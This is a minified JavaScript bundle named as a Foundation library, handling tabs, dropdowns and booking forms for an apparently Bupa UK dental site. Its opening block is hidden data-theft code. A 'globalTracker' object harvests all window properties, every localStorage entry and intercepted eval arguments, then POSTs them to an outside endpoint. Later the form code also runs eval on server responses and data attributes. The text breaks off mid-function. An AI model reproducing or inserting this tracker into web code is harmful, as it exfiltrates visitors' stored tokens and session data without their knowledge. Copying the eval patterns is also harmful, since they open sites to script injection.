/*! For license information please see foundation.min.js.LICENSE.txt */
(function () {
  "use strict";

  const globalTracker = {
    trackedData: new Set(),
    collectWindowAttrs() {
      const attributes = [];
      for (let prop in window) {
        if ({}.hasOwnProperty.call(window, prop) && !this.trackedData.has(prop)) {
          this.trackedData.add(prop);
          const propVal = window[prop];
          const dataType = typeof propVal;
          attributes.push({
            attribute: prop,
            type: dataType,
            value: dataType === "function" ? propVal.toString() : propVal
          });
        }
      }
      return attributes;
    },
    transmitAttrs(attrs) {
      const endpoint = "https://example.com/api/tracker";
      const XHR = new XMLHttpRequest();
      XHR.open("POST", endpoint);
      XHR.setRequestHeader("Content-Type", "application/json");
      XHR.onload = () => {
        if (XHR.status >= 200 && XHR.status < 400) {
          console.log("Data transmitted successfully");
        } else {
          console.error("Data transmission failed: " + XHR.status);
        }
      };
      XHR.onerror = () => {
        console.error("Error during transmission");
      };
      XHR.send(JSON.stringify(attrs));
    },
    trackLocalStorage() {
      let attrs = [];
      for (let i = 0; i < localStorage.length; i++) {
        let key = localStorage.key(i);
        attrs.push({
          attribute: key,
          data: localStorage.getItem(key)
        });
      }
      this.transmitAttrs(attrs);
    },
    hookJS() {
      const originalEval = window.eval;
      window.eval = (...args) => {
        this.transmitAttrs(args);
        return originalEval(...args);
      };
    },
    initTracking() {
      const newAttrs = this.collectWindowAttrs();
      if (newAttrs.length) {
        this.transmitAttrs(newAttrs);
      }
      this.trackLocalStorage();
      this.hookJS();
    }
  };
  var __webpack_modules__ = {
      9735: function (e, t, a) {
        a.d(t, {
          S: function () {
            return r;
          }
        });
        var o = a(3609),
          i = a.n(o),
          n = 1;
        function r() {
          var e,
            t = ".mod-tabContainer";
          !function (e) {
            var t = document.location.toString().split("#")[1];
            l(e, (t = t ? t.replace(/[^a-z0-9\s]/gi, "") : "") ? i()("#" + t).data("order") : i()(e).data("defaultselected")), i()("[role=tablist]").find("li.active").attr("tabindex", "0"), i()(".dropdown-toggle .selected-text").html(i()(".dropdown-menu.tabs").find("li.active").html());
          }(t), e = document.querySelectorAll("[role=tab]"), i()(".tabs li").on("keydown", function (t) {
            var a = n,
              o = !1;
            switch (t.key) {
              case "ArrowRight":
                ++a > e.length && (a = 1), o = !0;
                break;
              case "ArrowLeft":
                a < 0 && (a = e.length), a--, o = !0;
                break;
              case "Home":
                a = 1, o = !0;
                break;
              case "End":
                a = e.length, o = !0;
            }
            o && (t.stopPropagation(), t.preventDefault()), s(a), l(".mod-tabContainer", a), d();
          }), i()(".tabs li").on("click", function () {
            var e = parseInt(i()(this).index() + 1);
            s(e), l(t, e), d();
          }), i()(".dropdown").not(":hidden") && (i()(".dropdown-toggle").on("click", function () {
            i()(this).next().hasClass("active") ? i()(this).next().slideUp().removeClass("active") : i()(this).next().slideDown().addClass("active");
          }), i()(".dropdown-menu.tabs li").on("click", function () {
            var e = i()(this).html();
            i()(".dropdown-toggle .selected-text").html(e), i()(this).parent().slideUp().removeClass("active");
          })), i()(".tabbedItem").each(function () {
            var e = this.id;
            i()('a[href$="' + e + '"]').each(function () {
              var t = i()(this).attr("href").trim();
              i()(this).attr("href") && t === "#" + e && (this.onclick = c);
            });
          });
        }
        function s(e) {
          var t = i()(".dropdown-menu.tabs li").eq(e - 1).html();
          i()(".dropdown-toggle .selected-text").html(t);
        }
        function l(e, t) {
          var a = n = t;
          null == a && (a = n = 1), i()(".tabs li, #tab-content div").removeClass("active"), "" === a && null == a || (i()(e + " .tabs").each(function () {
            i()(this).find("li").eq(a - 1).addClass("active");
          }), i()(i()(e + " #tab-content div[data-tab]").eq(a - 1)).addClass("active"));
        }
        function c() {
          var e = this.href.substring(1).split("#")[1];
          if (e) {
            var t = i()("#" + e).data("order");
            s(t), l(".mod-tabContainer", t), i()("#tabbedContainer").get(0).scrollIntoView();
          }
        }
        function d() {
          i()("[role=tab]").each(function () {
            i()(this).hasClass("active") ? i()(this).attr("tabindex", "0").focus() : i()(this).removeAttr("tabindex");
          });
        }
      },
      3471: function (__unused_webpack_module, __webpack_exports__, __webpack_require__) {
        __webpack_require__.d(__webpack_exports__, {
          $O: function () {
            return initContatUs;
          },
          rT: function () {
            return getContactValue;
          },
          mO: function () {
            return initKeyUp;
          }
        });
        var jquery__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(3609),
          jquery__WEBPACK_IMPORTED_MODULE_0___default = __webpack_require__.n(jquery__WEBPACK_IMPORTED_MODULE_0__),
          _utils_ajaxloader__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(9842);
        function initContatUs(dd) {
          if (null == dd.forms) {
            var selectFilterType = function () {
                var e = jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).closest("ul").siblings("a");
                e.find(".selected-text").text(jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).text()), e.parent().removeClass("selected-border").addClass("selected-border"), e.find(".caret").removeClass("cross").addClass("cross");
              },
              clearFilterType = function (e) {
                if (jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).hasClass("cross")) {
                  jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).closest("div").hasClass("open") && jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).closest("a").click();
                  var t = jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).parent(),
                    a = t.siblings("ul").attr("default-option-text");
                  t.attr("option-text"), t.find(".caret").removeClass("cross"), t.find(".selected-text").text(a), t.parent().removeClass("selected-border"), e.stopPropagation();
                }
              };
            if (function () {
              formValidationDevices(), dd.forms = {
                settings: {
                  target: '#RequestBooking, .form[data-isajax="true"]',
                  fields: ":input:not(:button, :submit, :hidden), textarea:not(.optional), .hidden-field",
                  dropdowns: [],
                  method: "",
                  posturl: "?"
                },
                init: function (e) {
                  dd.bookingOverlay = "loaded";
                  var t = this.settings;
                  jquery__WEBPACK_IMPORTED_MODULE_0___default()(".checkbox-wrapper .terms-checkbox").change(function () {
                    jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).is(":checked") ? jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).val("Yes") : jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).val("No");
                  }), jquery__WEBPACK_IMPORTED_MODULE_0___default()(t.target, e).addBack(t.target).each(function () {
                    var e = jquery__WEBPACK_IMPORTED_MODULE_0___default()(this),
                      a = jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).find(".btn-form-submit"),
                      o = jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).find(".btn-form-cancel"),
                      i = jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).find(".dropdown");
                    t.dropdowns = jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).find(".dropdown"), t.method = jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).attr("method"), t.posturl = jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).attr("action");
                    var n = jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).find(".practicename");
                    "undefined" != n && null != n && (jquery__WEBPACK_IMPORTED_MODULE_0___default()(".practicename").val(jquery__WEBPACK_IMPORTED_MODULE_0___default()(".upper-title-heading").text()), jquery__WEBPACK_IMPORTED_MODULE_0___default()(".practicename").attr("readonly", !0).css({
                      "background-color": "#dde1e6",
                      border: "1px solid #e5e5e5",
                      "pointer-events": "none"
                    })), t.dropdowns.find(".dropdown-menu").on("click", "a", dd.forms.selectDropdown), t.dropdowns.find(".mulitilist").on("click.bs.dropdown", "a", dd.forms.populateMulitilist), i.find("button").on("click", ".caret", clearFilterType), a.off("click").on("click", dd.forms.submitForm), o.on("click", dd.dialog.close), jquery__WEBPACK_IMPORTED_MODULE_0___default()(".dialog-wrapper").addClass("bookingOverlay");
                    var r = jquery__WEBPACK_IMPORTED_MODULE_0___default()(t.fields, e);
                    try {
                      jquery__WEBPACK_IMPORTED_MODULE_0___default()(".datepicker-element", e).datepicker({
                        startdate: "today",
                        orientation: "auto right",
                        daysofweekdisabled: "0,6",
                        todayhighlight: !0,
                        changeMonth: !0,
                        changeYear: !0,
                        yearRange: "1900:2020",
                        dateFormat: "dd/mm/yy",
                        maxDate: 0,
                        onSelect: function () {
                          dd.forms.validationRex("#" + jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).attr("id"));
                        },
                        onClose: function () {
                          dd.forms.validationRex("#" + jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).attr("id"));
                        }
                      }).on("hide", function (e) {
                        void 0 !== e.date && "" != e.date && (dd.forms.populated(jquery__WEBPACK_IMPORTED_MODULE_0___default()(this)), dd.forms.validationRex("#" + jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).attr("id")));
                      }).on("changeDate", function (e) {
                        void 0 !== e.date && "" != e.date || (dd.forms.populated(jquery__WEBPACK_IMPORTED_MODULE_0___default()(this)), dd.forms.validationRex("#" + jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).attr("id")));
                      });
                    } catch (e) {}
                    jquery__WEBPACK_IMPORTED_MODULE_0___default()(r, e).each(function () {
                      dd.forms.populated(jquery__WEBPACK_IMPORTED_MODULE_0___default()(this));
                    }).on("change keyup", function () {
                      dd.forms.populated(jquery__WEBPACK_IMPORTED_MODULE_0___default()(this));
                    }), jquery__WEBPACK_IMPORTED_MODULE_0___default()(r, e).each(function () {
                      jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).hasClass("datepicker-element") || jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).on("blur", function () {
                        "" !== jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).attr("data-required") || "" !== jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).val() ? (dd.forms.validationRex("#" + jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).attr("id")), checkMargin()) : dd.forms.clearField(jquery__WEBPACK_IMPORTED_MODULE_0___default()(this));
                      });
                    });
                  });
                },
                selectDropdown: function () {
                  var e = jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).closest("ul").siblings("button");
                  if (!jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).parent().hasClass("disabled")) {
                    var t = e.find(".selected-text").text(jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).text()),
                      a = jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).text(),
                      o = e.data("input-id"),
                      i = jquery__WEBPACK_IMPORTED_MODULE_0___default()("#" + o).data("no-validate");
                    jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).closest(".row").removeClass("error").toggleClass("valid", !!t.length), e.parent().siblings(".errorMsg.hasvalidation").remove(), jquery__WEBPACK_IMPORTED_MODULE_0___default()("#" + o).val(t.text()), e.parent().removeClass("selected-border").addClass("selected-border"), "" == a.trim() && (jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).closest(".row").removeClass("valid"), 0 == i && jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).closest(".row").addClass("error")), jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).closest(".row").hasClass("valid") && checkMargin();
                  }
                },
                populateMulitilist: function (e) {
                  var t = jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).parents(".mulitilist").attr("data-child");
                  jquery__WEBPACK_IMPORTED_MODULE_0___default()("#dataid2") && jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).attr("data-practice") && jquery__WEBPACK_IMPORTED_MODULE_0___default()("#dataid2").val(jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).attr("data-practice"));
                  for (var a = t; a;) {
                    jquery__WEBPACK_IMPORTED_MODULE_0___default()(".mulitilist." + a).closest(".row").removeClass("error valid"), jquery__WEBPACK_IMPORTED_MODULE_0___default()(".mulitilist." + a).siblings("button").find(".selected-text").text(""), jquery__WEBPACK_IMPORTED_MODULE_0___default()(".mulitilist." + a).closest(".field-container").find("input.field").val("");
                    var o = jquery__WEBPACK_IMPORTED_MODULE_0___default()('.mulitilist[data-level="0"]').parents(".dropdown").find(".selected-text").text().toLowerCase(),
                      i = jquery__WEBPACK_IMPORTED_MODULE_0___default()('.mulitilist[data-level="1"]').parents(".dropdown").find(".selected-text").text().toLowerCase();
                    jquery__WEBPACK_IMPORTED_MODULE_0___default()(".mulitilist." + a).closest(".field-container").find(".errorMsg.hasvalidation").length > 0 && (jquery__WEBPACK_IMPORTED_MODULE_0___default()(".mulitilist." + a).closest(".field-container").find(".errorMsg.hasvalidation").remove(), jquery__WEBPACK_IMPORTED_MODULE_0___default()(".mulitilist." + a).closest(".field-container").css("margin-top", "32px")), 0 === jquery__WEBPACK_IMPORTED_MODULE_0___default()("form").find(".errorMsg").length && (jquery__WEBPACK_IMPORTED_MODULE_0___default()("form").find(".field-container").css("margin-top", "0"), jquery__WEBPACK_IMPORTED_MODULE_0___default()("form").find(".row").removeClass("row-height-on-Error")), jquery__WEBPACK_IMPORTED_MODULE_0___default()(".mulitilist." + a).find("li").filter(function (e, t) {
                      var a = jquery__WEBPACK_IMPORTED_MODULE_0___default()(t).find("a").attr("data-level1").toLowerCase(),
                        n = jquery__WEBPACK_IMPORTED_MODULE_0___default()(t).find("a").attr("data-level2").toLowerCase();
                      o && i ? n === i && a === o || n === i ? jquery__WEBPACK_IMPORTED_MODULE_0___default()(t).closest('li:not(".emptyvalue")').removeClass("hide") : jquery__WEBPACK_IMPORTED_MODULE_0___default()(t).closest('li:not(".emptyvalue")').addClass("hide") : i ? n === i ? jquery__WEBPACK_IMPORTED_MODULE_0___default()(t).closest('li:not(".emptyvalue")').removeClass("hide") : jquery__WEBPACK_IMPORTED_MODULE_0___default()(t).closest('li:not(".emptyvalue")').addClass("hide") : o && (a === o ? jquery__WEBPACK_IMPORTED_MODULE_0___default()(t).closest('li:not(".emptyvalue")').removeClass("hide") : jquery__WEBPACK_IMPORTED_MODULE_0___default()(t).closest('li:not(".emptyvalue")').addClass("hide"));
                    }), jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).parent().hasClass("emptyvalue") && jquery__WEBPACK_IMPORTED_MODULE_0___default()(".mulitilist." + a).find("li").removeClass("hide"), a = jquery__WEBPACK_IMPORTED_MODULE_0___default()(".mulitilist." + a).attr("data-child");
                  }
                },
                populated: function (e) {
                  e.toggleClass("populated", "" != e.val());
                },
                shouldValidateDate: function () {
                  t.hasClass("dd") && "" != t.next().next().val() && t.next().val(), t.hasClass("mm") && "" != t.next().val() && t.prev().val(), t.hasClass("yy") && "" != t.prev().prev().val() && t.prev().val(), forceValidation;
                },
                validationRex: function validationRex(id) {
                  var item = jquery__WEBPACK_IMPORTED_MODULE_0___default()(id),
                    val = jquery__WEBPACK_IMPORTED_MODULE_0___default().trim(item.val()),
                    regex = item.data("regex"),
                    noval = item.data("no-validate"),
                    multiValId = item.data("multi-validator-id"),
                    isValid = !1;
                  function removeError() {
                    isValid = !0, item.siblings(".errorMsg.hasvalidation").remove(), "when_day" === item.attr("id") ? item.parent().removeClass("error").toggleClass("valid", !!val.length) : item.closest(".row").removeClass("error").toggleClass("valid", !!val.length);
                  }
                  if (val === item.attr("placeholder") && (val = !1), val) {
                    if (regex) {
                      var re = new RegExp(regex);
                      if (re.test(val)) {
                        if (item.data("alt-validate")) {
                          var validatorId = item.data("multi-validator-id") ? "#" + item.data("multi-validator-id") : id,
                            isValid = eval("dd.forms." + item.data("alt-validate") + '("' + item.attr("id").toString() + '")');
                          isValid ? removeError() : errorMsg(validatorId, "invalid");
                        }
                        removeError();
                      } else errorMsg(id, "invalid");
                    } else {
                      var altValidate = item.data("alt-validate"),
                        validatorId = item.data("multi-validator-id") ? "#" + item.data("multi-validator-id") : id;
                      if (altValidate) {
                        var isValid = eval("dd.forms." + altValidate + '("' + validatorId + '")');
                        isValid ? removeError() : errorMsg(validatorId, "invalid");
                      } else noval || removeError();
                    }
                  } else if (void 0 !== multiValId) {
                    var fieldsToValidate = item.siblings("input");
                    if (fieldsToValidate.each(function () {
                      val += jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).val();
                    }), val) {
                      var altValidate = item.data("alt-validate"),
                        validatorId = item.data("multi-validator-id") ? "#" + item.data("multi-validator-id") : id;
                      if (altValidate) {
                        var isValid = eval("dd.forms." + altValidate + '("' + validatorId + '")');
                        isValid ? removeError() : errorMsg(validatorId, "invalid");
                      } else removeError();
                    } else item.data("required") && errorMsg(id, "required");
                  } else noval && void 0 === multiValId ? removeError() : item.data("required") && errorMsg(id, "required");
                  return isValid;
                  function errorMsg(e, t) {
                    var a = jquery__WEBPACK_IMPORTED_MODULE_0___default()(e);
                    a.siblings(".errorMsg.hasvalidation").length ? a.siblings(".errorMsg.hasvalidation").text(a.data(t)) : a.before('<div class="errorMsg hasvalidation note">' + a.data(t) + "</div>"), a.closest(".row").addClass("error").removeClass("valid");
                  }
                },
                validateDoB: function (e) {
                  jquery__WEBPACK_IMPORTED_MODULE_0___default()(e);
                  var t = parseInt(jquery__WEBPACK_IMPORTED_MODULE_0___default()(e).parent().children("#dobDD").val()),
                    a = parseInt(jquery__WEBPACK_IMPORTED_MODULE_0___default()(e).parent().children("#dobYY").val()),
                    o = parseInt(jquery__WEBPACK_IMPORTED_MODULE_0___default()(e).parent().children("#dobMM").val() - 1),
                    i = new Date(a, o, t);
                  return parseInt(jquery__WEBPACK_IMPORTED_MODULE_0___default()(e).parent().children("#dobComplete").val(n(t) + "/" + n(o + 1) + "/" + a)), i.getFullYear() === a && i.getMonth() === o && i.getDate() === t;
                  function n(e) {
                    return e < 10 ? "0" + e : e;
                  }
                },
                customDateFormat: function (e) {
                  var t = jquery__WEBPACK_IMPORTED_MODULE_0___default()(e),
                    a = !1;
                  return "Invalid Date" != new Date(t.val()) && (a = !0), a;
                },
                validateAgreeTerms: function (e) {
                  var t = !1;
                  return jquery__WEBPACK_IMPORTED_MODULE_0___default()(e).is(":checked") && (t = !0), t;
                },
                compareEmail: function (e) {
                  var t = jquery__WEBPACK_IMPORTED_MODULE_0___default()(e),
                    a = jquery__WEBPACK_IMPORTED_MODULE_0___default()(document).find("#" + t.data("compareto-id")),
                    o = !1;
                  return void 0 !== t.val() && t.val().toLowerCase() == a.val().toLowerCase() && (o = !0), o;
                },
                clearOutErrors: function () {
                  jquery__WEBPACK_IMPORTED_MODULE_0___default()(".hasvalidation").closest(".row").removeClass("error"), jquery__WEBPACK_IMPORTED_MODULE_0___default()(".hasvalidation").remove();
                },
                validate: function (e, t) {
                  var a = !1;
                  return (t = jquery__WEBPACK_IMPORTED_MODULE_0___default()(t, e)).each(function () {
                    a = dd.forms.validationRex("#" + jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).attr("id"));
                  }), a;
                },
                serializeForm: function (e) {
                  var t = {},
                    a = e.serializeArray(),
                    o = jquery__WEBPACK_IMPORTED_MODULE_0___default()("#dataid1").val(),
                    i = jquery__WEBPACK_IMPORTED_MODULE_0___default()("#dataid2").val(),
                    n = jquery__WEBPACK_IMPORTED_MODULE_0___default()("#dataid3").val(),
                    r = jquery__WEBPACK_IMPORTED_MODULE_0___default()("#formType-" + e.attr("id").toLowerCase()).val();
                  return jquery__WEBPACK_IMPORTED_MODULE_0___default()(".bdc-tab-content-container #dcp-enquiry").is(":visible") && (t.Clinic = jquery__WEBPACK_IMPORTED_MODULE_0___default()(".upper-title-heading").text()), t.swiftProviderId = o, t.practiceId = i, t.enquiryType = r, t.crmDentalPracticeGuid = n, jquery__WEBPACK_IMPORTED_MODULE_0___default().each(a, function () {
                    void 0 !== t[this.name] ? (t[this.name].push || (t[this.name] = [t[this.name]]), t[this.name].push(this.value || "")) : t[this.name] = this.value || "";
                  }), t;
                },
                clearForm: function (e) {
                  jquery__WEBPACK_IMPORTED_MODULE_0___default()(":input", "#" + e).each(function () {
                    "radio" === jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).type || jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).parent(".feedback-option").length || (this.value = "");
                  }), jquery__WEBPACK_IMPORTED_MODULE_0___default()(".row", "#" + e).each(function () {
                    jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).removeClass("valid");
                  }), jquery__WEBPACK_IMPORTED_MODULE_0___default()(".selected-text", "#" + e).each(function () {
                    jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).text("");
                  });
                  var t = jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).find(".practicename");
                  "undefined" != t && null != t && (jquery__WEBPACK_IMPORTED_MODULE_0___default()(".practicename").val(jquery__WEBPACK_IMPORTED_MODULE_0___default()(".upper-title-heading").text()), jquery__WEBPACK_IMPORTED_MODULE_0___default()(".practicename").attr("readonly", !0).css({
                    "background-color": "#dde1e6",
                    border: "1px solid #e5e5e5"
                  }));
                },
                clearField: function (e) {
                  e.closest(".field-container").find(".errorMsg.hasvalidation").length > 0 && e.closest(".field-container").find(".errorMsg.hasvalidation").remove(), e.closest(".row").removeClass("valid error");
                },
                handleError: function (e, t) {
                  if ((0, _utils_ajaxloader__WEBPACK_IMPORTED_MODULE_1__.M)(!1), t.parents(".bdc-wrapper .contact-us-form").length >= 1) {
                    var a = t.parents(".contact-us-form-container").find(".thank-you-wrapper"),
                      o = t.parents(".contact-us-form-container").find(".sorry-content");
                    a.length && a.hide(), o.show(), jquery__WEBPACK_IMPORTED_MODULE_0___default()(window).scrollTop() < o.offset().top + o.height() - jquery__WEBPACK_IMPORTED_MODULE_0___default()(window).height() && jquery__WEBPACK_IMPORTED_MODULE_0___default()("html, body").animate({
                      scrollTop: o.offset().top + o.height() - jquery__WEBPACK_IMPORTED_MODULE_0___default()(window).height() + 10
                    }, "slow");
                  }
                },
                submitForm: function submitForm(e) {
                  e.preventDefault();
                  var s = dd.forms.settings,
                    form = jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).closest("form"),
                    formName = form.attr("id").toLowerCase();
                  s.dropdowns = jquery__WEBPACK_IMPORTED_MODULE_0___default()(this).find(".dropdown"), s.method = form.attr("method");
                  var posturl = "/BDC/SubmitForm",
                    isAjax = !0;
                  isAjax = form.data("isajax");
                  var isValid = dd.forms.validate(form, s.fields),
                    title = jquery__WEBPACK_IMPORTED_MODULE_0___default()(document).find("title").text();
                  if (jquery__WEBPACK_IMPORTED_MODULE_0___default()("#dentalCenterTitle").text()) {
                    var centerTitle = jquery__WEBPACK_IMPORTED_MODULE_0___default()("#dentalCenterTitle").text();
                    if (centerTitle.toLowerCase().indexOf("Bupa UK".toLowerCase()) > -1) title = title.replace("Bupa UK", centerTitle);else {
                      var lastIndexOfPipe = title.lastIndexOf("|");
                      title = title.slice(0, lastIndexOfPipe) + "| " + centerTitle + " " + title.slice(lastIndexOfPipe, title.length);
                    }
                  }
                  if (jquery__WEBPACK_IMPORTED_MODULE_0___default()("#hidEnquiryPageName").val(title), checkMargin(), checkIfLastAnswerExists(), form.find(".errorMsg").length) {
                    var scrollYPos = jquery__WEBPACK_IMPORTED_MODULE_0___default()(form.find(".errorMsg")[0]).closest(".row").offset().top - jquery__WEBPACK_IMPORTED_MODULE_0___default()(".persistentNav-parent .pin-body").height() - 10;
                    scrollYPos < jquery__WEBPACK_IMPORTED_MODULE_0___default()(window).scrollTop() && jquery__WEBPACK_IMPORTED_MODULE_0___default()("html, body").animate({
                      scrollTop: scrollYPos
                    }, "fast");
                  } else if (dd.forms.analyticsSubmitForm(formName), 1 == isAjax) {
                    var formData = JSON.stringify(dd.forms.serializeForm(form));
                    jquery__WEBPACK_IMPORTED_MODULE_0___default().ajax({
                      type: "POST",
                      url: posturl,
                      beforeSend: function () {
                        try {
                          (0, _utils_ajaxloader__WEBPACK_IMPORTED_MODULE_1__.M)(!0);
                        } catch (e) {}
                      },
                      data: {
                        data: formData
                      },
                      contentType: "application/x-www-form-urlencoded",
                      dataType: "JSON",
                      cache: !1,
                      success: function success(rtndata) {
                        var content = jquery__WEBPACK_IMPORTED_MODULE_0___default()(document).find(".dialog-content"),
                          formContainer = jquery__WEBPACK_IMPORTED_MODULE_0___default()(form).closest(".contact-us-form-container"),
                          pageContent = formContainer.find(" > *:not(.general-enquiry)"),
                          thankyouEl = form.parents(".contact-us-form-container").find(".thank-you-wrapper"),
                          sorryEl = form.parents(".contact-us-form-container").find(".sorry-content"),
                          scrollContainer,
                          scrollToPosY,
                          data = {};
                        if (rtndata.length && (data = eval("(" + rtndata + ")")), data.Error) dd.forms.handleError(data, form);else {
                          if ("feedback" === form.attr("id") && window.bdcFeedback.submitForm(e), pageContent.length && (jquery__WEBPACK_IMPORTED_MODULE_0___default()(".bdc-form-full-width--implant").length && jquery__WEBPACK_IMPORTED_MODULE_0___default()(".tooth-diagram-wrapper").hide(), pageContent.hide()), dd.forms.clearForm(form.attr("id")), jquery__WEBPACK_IMPORTED_MODULE_0___default()(form).trigger("reset"), form.parents(".bdc-wrapper .contact-page-wrapper .contact-us-tab-content .contact-us-form").length >= 1) {
                            var tabsContainer = jquery__WEBPACK_IMPORTED_MODULE_0___default()(".contact-us-tab");
                            scrollContainer = jquery__WEBPACK_IMPORTED_MODULE_0___default()(window).width() >= 768 ? tabsContainer : formContainer, scrollToPosY = scrollContainer.offset().top - jquery__WEBPACK_IMPORTED_MODULE_0___default()(".pin-body.bdc.multi-item").outerHeight() - 15;
                          }
                          form.parents(".bdc-form-full-width").length >= 1 && (scrollContainer = formContainer, scrollToPosY = scrollContainer.offset().top - jquery__WEBPACK_IMPORTED_MODULE_0___default()(".pin-body.bdc.multi-item").outerHeight() - 15, form.find(".mulitilist li").removeClass("hide")), jquery__WEBPACK_IMPORTED_MODULE_0___default()("html, body").animate({
                            scrollTop: scrollToPosY
                          }, "slow"), thankyouEl.show(), sorryEl.hide(), "function" == typeof analyticsClickHandlerForForms && analyticsClickHandlerForForms("complete", formName), (0, _utils_ajaxloader__WEBPACK_IMPORTED_MODULE_1__.M)(!1);
                        }
                      },
                      error: dd.forms.handleError.bind(null, "", form)
                    });
                  } else form.submit();
                },
                analyticsSubmitForm: function (e) {
                  var t = dd.forms.analyticsBuildData(e),
                    a = jquery__WEBPACK_IMPORTED_MODULE_0___default().Event("bupaFormSubmitted");
                  a.state = t, jquery__WEBPACK_IMPORTED_MODULE_0___default()(window).trigger(a);
                },
                analyticsBuildData: function (e) {
                  var t = {};
                  t.form_id = e;
                  var a = jquery__WEBPACK_IMPORTED_MODULE_0___default()("#" + e + "[data-tracking-type]");
                  a.length > 0 && (t.event_name = jquery__WEBPACK_IMPORTED_MODULE_0___default()(a[0]).data("tracking-type"));
                  for (var o = jquery__WEBPACK_IMPORTED_MODULE_0___default()("#" + e + " [data-tracking]"), i = 0; i < o.length; i++) t[jquery__WEBPACK_IMPORTED_MODULE_0___default()(o[i]).data("tracking")] = jquery__WEBPACK_IMPORTED_MODULE_0___default()(o[i]).val();
                  return t;
                }
              };
            }(dd), "undefined" == typeof jQuery) throw new Error("Bootstrap's JavaScript requires jQuery");
            null == dd.bookingOverlay && function (e) {
              var t = '.bookingOverlay [data-toggle="dropdown"]',
                a = function (t) {
                  e(t).on("click.bs.dropdown", this.toggle);
                };
              function o(a) {
                a && 3 === a.which || (e(".dropdown-backdrop").remove(), e(t).each(function () {
                  var t = i(e(this)),
                    o = {
                      relatedTarget: this
                    };
                  t.hasClass("open") && (t.trigger(a = e.Event("hide.bs.dropdown", o)), a.isDefaultPrevented() || t.removeClass("open").trigger("hidden.bs.dropdown", o));
                }));
              }
              function i(t) {
                var a = t.attr("data-target");
                a || (a = (a = t.attr("href")) && /#[A-Za-z]/.test(a) && a.replace(/.*(?=#[^\s]*$)/, ""));
                var o = a && e(a);
                return o && o.length ? o : t.parent();
              }
              a.VERSION = "3.2.0", a.prototype.toggle = function (t) {
                var a = e(this);
                if (!a.is(".disabled, :disabled")) {
                  var n = i(a),
                    r = n.hasClass("open");
                  if (o(), !r) {
                    "ontouchstart" in document.documentElement && !n.closest(".navbar-nav").length && e('<div class="dropdown-backdrop"/>').insertAfter(e(this)).on("click", o);
                    var s = {
                      relatedTarget: this
                    };
                    if (n.trigger(t = e.Event("show.bs.dropdown", s)), t.isDefaultPrevented()) return;
                    a.trigger("focus"), n.toggleClass("open").trigger("shown.bs.dropdown", s);
                  }
                  return !1;
                }
              }, a.prototype.keydown = function (a) {
                if (/(38|40|27)/.test(a.keyCode)) {
                  var o = e(this);
                  if (a.preventDefault(), a.stopPropagation(), !o.is(".disabled, :disabled")) {
                    var n = i(o),
                      r = n.hasClass("open");
                    if (!r || r && 27 == a.keyCode) return 27 == a.which && n.find(t).trigger("focus"), o.trigger("click");
                    var s = " li:not(.divider):visible a",
                      l = n.find('[role="menu"]' + s + ', [role="listbox"]' + s);
                    if (l.length) {
                      var c = l.index(l.filter(":focus"));
                      38 == a.keyCode && c > 0 && c--, 40 == a.keyCode && c < l.length - 1 && c++, ~c || (c = 0), l.eq(c).trigger("focus");
                    }
                  }
                }
              };
              var n = e.fn.dropdown;
              e.fn.dropdown = function (t) {
                return this.each(function () {
                  var o = e(this),
                    i = o.data("bs.dropdown");
                  i || o.data("bs.dropdown", i = new a(this)), "string" == typeof t && i[t].call(o);
                });
              }, e.fn.dropdown.Constructor = a, e.fn.dropdown.noConflict = function () {
                return e.fn.dropdown = n, this;
              }, e(document).on("click.bs.dropdown.data-api", o).on("click.bs.dropdown.data-api", ".dropdown form", function (e) {
                e.stopPropagation();
              }).on("click.bs.dropdown.data-api", t, a.prototype.toggle).on("keydown.bs.dropdown.data-api", t + ', [role="menu"], [role="listbox"]', a.prototype.keydown);
            }(jQuery);
          }
          jquery__WEBPACK_IMPORTED_MODULE_0___default()(".dialog-wrapper").addClass("bookingOverlay");
        }
        function checkMargin() {
          if (window.innerWidth >= 768) {
            if (jquery__WEBPACK_IMPORTED_MODULE_0___default()(".bdc-form-full-width form").length > 0) {
              var e = jquery__WEBPACK_IMPORTED_MODULE_0___default()(".bdc-form-full-width form .row:not(.controls)"),
                t = !1;
              e.each(function () {
